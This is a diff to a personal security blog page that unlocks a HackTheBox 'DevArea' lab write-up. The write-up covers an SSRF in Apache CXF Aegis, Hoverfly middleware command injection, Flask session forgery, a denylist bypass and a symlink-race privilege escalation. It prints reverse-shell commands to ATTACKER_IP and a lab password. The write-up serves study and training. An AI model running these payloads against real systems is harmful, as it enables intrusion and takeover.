@@ -742,7 +742,7 @@ a { color: inherit; text-decoration: none; }
           </div>
           <div class="file-entry" data-post="htb-devarea" onclick="openPost('htb-devarea', this)">
             <span class="file-icon">&#128196;</span>
-            DevArea &#128274;
+            DevArea
             <span class="file-difficulty diff-medium">Med</span>
           </div>
           <div class="file-entry" data-post="htb-cctv" onclick="openPost('htb-cctv', this)">
@@ -2114,7 +2114,7 @@ connect to [10.10.14.91] from (UNKNOWN) [10.129.8.218] 39152</span>
         </div>
       </div>
 
-      <!-- HTB: DevArea (LOCKED) -->
+      <!-- HTB: DevArea -->
       <div class="content-pane" id="post-htb-devarea">
         <div class="post-meta">
           <span class="post-badge badge-htb">HTB</span>
@@ -2127,12 +2127,76 @@ connect to [10.10.14.91] from (UNKNOWN) [10.129.8.218] 39152</span>
           <span class="post-tag">htb</span>
           <span class="post-tag">linux</span>
           <span class="post-tag">medium</span>
-          <span class="post-tag">active</span>
+          <span class="post-tag">ssrf</span>
+          <span class="post-tag">cve-2024-28752</span>
+          <span class="post-tag">hoverfly</span>
+          <span class="post-tag">symlink-race</span>
         </div>
-        <div style="display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 300px; text-align: center; padding: 3rem 2rem;">
-          <div style="font-size: 4rem; margin-bottom: 1.5rem; opacity: 0.6;">&#128274;</div>
-          <p style="font-size: 1.15rem; color: var(--text-secondary); margin-bottom: 1rem;">This writeup is locked while the box is active on HackTheBox.</p>
-          <div id="devarea-timer" style="font-family: var(--font-mono); font-size: 1.8rem; color: var(--accent); font-weight: 700; letter-spacing: 0.05em;"></div>
+        <div class="post-body">
+          <h2>Summary</h2>
+          <p>DevArea is a medium Linux box featuring a developer talent platform with a rich service stack: FTP, Apache, a Java SOAP service, and the Hoverfly API simulation tool. The attack chain begins with an SSRF vulnerability in Apache CXF's Aegis databinding (<strong>CVE-2024-28752</strong>) that leaks credentials from a systemd service file, enabling command injection through Hoverfly's middleware endpoint (<strong>CVE-2025-54123</strong>) for a foothold as <code>dev_ryan</code>. Privilege escalation requires chaining a Flask session forgery, command injection as the <code>syswatch</code> service user, and a symlink race in a custom monitoring script's logging function to inject a malicious plugin that executes as root.</p>
+
+          <h2>Reconnaissance</h2>
+          <pre><span class="keyword">$</span> nmap -p- -sC -sV -T4 10.129.10.193</pre>
+          <table>
+            <thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead>
+            <tbody>
+              <tr><td>21</td><td>FTP</td><td>vsftpd 3.0.5 (anonymous login)</td></tr>
+              <tr><td>22</td><td>SSH</td><td>OpenSSH 9.6p1 Ubuntu</td></tr>
+              <tr><td>80</td><td>HTTP</td><td>Apache 2.4.58 &rarr; devarea.htb</td></tr>
+              <tr><td>8080</td><td>HTTP</td><td>Jetty 9.4.27 &mdash; Apache CXF SOAP service</td></tr>
+              <tr><td>8500</td><td>HTTP</td><td>Golang proxy &mdash; Hoverfly proxy</td></tr>
+              <tr><td>8888</td><td>HTTP</td><td>Hoverfly Dashboard (auth required)</td></tr>
+            </tbody>
+          </table>
+          <p>Anonymous FTP contains <code>pub/employee-service.jar</code> &mdash; a shaded Maven artifact. The pom.xml reveals <strong>Apache CXF 3.2.14</strong> with the <strong>Aegis databinding</strong> (<code>cxf-rt-databinding-aegis</code>), which is vulnerable to CVE-2024-28752 (SSRF). Jetty 9.4.27 is from February 2020 &mdash; significantly outdated.</p>
+
+          <h2>Foothold &mdash; CVE-2024-28752: Apache CXF Aegis SSRF</h2>
+          <p>Apache CXF versions before 3.5.8 with Aegis databinding are vulnerable to SSRF via XOP (XML-binary Optimized Packaging) Include elements. An <code>&lt;xop:Include href="..."&gt;</code> element inside any string parameter causes the server to fetch the referenced URL and return the content base64-encoded in the response.</p>
+          <div class="callout">
+            <div class="callout-label">Key Detail</div>
+            The Aegis databinding resolves XOP Include references during deserialization without restricting the URL scheme. <code>file:///</code> reads local files and <code>http://</code> performs SSRF. The default JAXB binding is NOT affected &mdash; only Aegis.
+          </div>
+          <p>Reading <code>/etc/systemd/system/hoverfly.service</code> via SSRF reveals plaintext Hoverfly admin credentials in the <code>ExecStart</code> directive:</p>
+          <pre><span class="string">ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU</span></pre>
+
+          <h3>CVE-2025-54123: Hoverfly Middleware RCE</h3>
+          <p>Hoverfly versions &lt;= 1.11.3 have a command injection vulnerability in the <code>/api/v2/hoverfly/middleware</code> endpoint. The <code>binary</code> and <code>script</code> fields are passed to <code>/bin/bash</code> without sanitization.</p>
+          <pre><span class="keyword">$</span> curl -X PUT http://10.129.10.193:8888/api/v2/hoverfly/middleware \
+  -H <span class="string">"Authorization: Bearer &lt;JWT_TOKEN&gt;"</span> \
+  -H <span class="string">"Content-Type: application/json"</span> \
+  -d <span class="string">'{"binary":"bash","script":"bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/9001 0&gt;&amp;1"}'</span></pre>
+          <p>Shell as <code>dev_ryan</code>. SSH key planted for stable access.</p>
+          <div class="flag-box">user.txt captured via SSH as dev_ryan</div>
+
+          <h2>Privilege Escalation &mdash; Flask Forgery + Symlink Race</h2>
+          <p>A custom monitoring stack (<strong>SysWatch</strong>) runs at <code>/opt/syswatch/</code>. The source is in dev_ryan's home directory as a zip. Key components: a management script (<code>syswatch.sh</code>) with <code>sudo NOPASSWD</code>, a monitor that executes all <code>plugins/*.sh</code> as root every 5 minutes, and a Flask web GUI on localhost:7777.</p>
+
+          <h3>Flask Session Forgery + Command Injection</h3>
+          <p>The Flask secret key is readable via CXF SSRF. The <code>service_status</code> endpoint passes input to <code>subprocess</code> with <code>shell=True</code>, filtered by a regex denylist that blocks <code>; / \ &amp; . &lt; &gt;</code> and uppercase &mdash; but allows <code>|</code> (pipe). The <code>/</code> restriction is bypassed via <code>xxd</code> hex encoding:</p>
+          <pre><span class="keyword">$</span> curl -s -b <span class="string">"session=&lt;FORGED_COOKIE&gt;"</span> \
+  <span class="string">"http://127.0.0.1:7777/service-status?service=ssh+|echo+${HEX}+|xxd+-r+-p+|bash"</span>
+<span class="string">uid=984(syswatch) gid=984(syswatch)</span></pre>
+
+          <h3>Symlink Race &mdash; log_message Inconsistency</h3>
+          <p>The critical insight: <code>common.sh</code>'s <code>log_message</code> has symlink protection, but <code>syswatch.sh</code>'s <code>log_message</code> does <strong>not</strong>. The syswatch user owns <code>logs/</code> and can create symlinks there. Replace <code>logs/system.log</code> with a symlink to <code>plugins/health_check.sh</code>, then trigger <code>log_message</code> via sudo to inject a reverse shell into the plugin:</p>
+          <pre><span class="comment"># Step 1: Symlink (via command injection as syswatch)</span>
+rm -f /opt/syswatch/logs/system.log
+ln -s /opt/syswatch/plugins/health_check.sh /opt/syswatch/logs/system.log
+
+<span class="comment"># Step 2: Inject reverse shell via sudo (as dev_ryan)</span>
+<span class="keyword">$</span> sudo /opt/syswatch/syswatch.sh plugin log_monitor.sh $<span class="string">'\nbash -i &gt;&amp; /dev/tcp/ATTACKER_IP/9003 0&gt;&amp;1\n'</span></pre>
+          <p>Wait up to 5 minutes for the <code>syswatch-monitor.timer</code> to fire. When it does, <code>monitor.sh</code> executes all <code>plugins/*.sh</code> as root &mdash; including the injected reverse shell.</p>
+          <div class="flag-box">root.txt captured via symlink race &rarr; plugin injection &rarr; root shell</div>
+
+          <h2>Key Takeaways</h2>
+          <ul>
+            <li><strong>Aegis databinding is a red flag</strong> &mdash; only Aegis (not JAXB) is affected by CVE-2024-28752. If you see <code>cxf-rt-databinding-aegis</code> in a pom.xml, test for XOP Include SSRF immediately.</li>
+            <li><strong>Credentials in systemd units</strong> &mdash; service files often contain passwords in <code>ExecStart</code> directives. Always read systemd units when you have file read access.</li>
+            <li><strong>Inconsistent security controls</strong> &mdash; the <code>common.sh</code> log_message had symlink protection; <code>syswatch.sh</code>'s did not. Compare all implementations of the same logical operation.</li>
+            <li><strong>Regex denylists are bypassable</strong> &mdash; the filter blocked obvious injection chars but missed pipe (<code>|</code>), which combined with <code>xxd</code> hex encoding bypassed all restrictions.</li>
+            <li><strong>Symlink attacks + privileged writers</strong> &mdash; when you control a directory that a privileged process writes to, symlinks redirect writes to arbitrary files. <code>fs.protected_symlinks</code> only protects sticky-bit directories.</li>
+          </ul>
         </div>
       </div>
 
@@ -2317,28 +2381,6 @@ document.getElementById('searchInput').addEventListener('input', function() {
     }
   });
 });
-
-// ── DEVAREA COUNTDOWN TIMER ───────────────────────
-(function() {
-  const unlockDate = new Date('2026-04-05T00:00:00Z').getTime();
-  const timerEl = document.getElementById('devarea-timer');
-  if (!timerEl) return;
-  function tick() {
-    const now = Date.now();
-    const diff = unlockDate - now;
-    if (diff <= 0) {
-      timerEl.textContent = 'Writeup available soon';
-      return;
-    }
-    const d = Math.floor(diff / 86400000);
-    const h = Math.floor((diff % 86400000) / 3600000);
-    const m = Math.floor((diff % 3600000) / 60000);
-    const s = Math.floor((diff % 60000) / 1000);
-    timerEl.textContent = 'Unlocks in: ' + d + 'd ' + h + 'h ' + m + 'm ' + s + 's';
-  }
-  tick();
-  setInterval(tick, 1000);
-})();
 
 // ── INIT ──────────────────────────────────────────
 renderTabs();
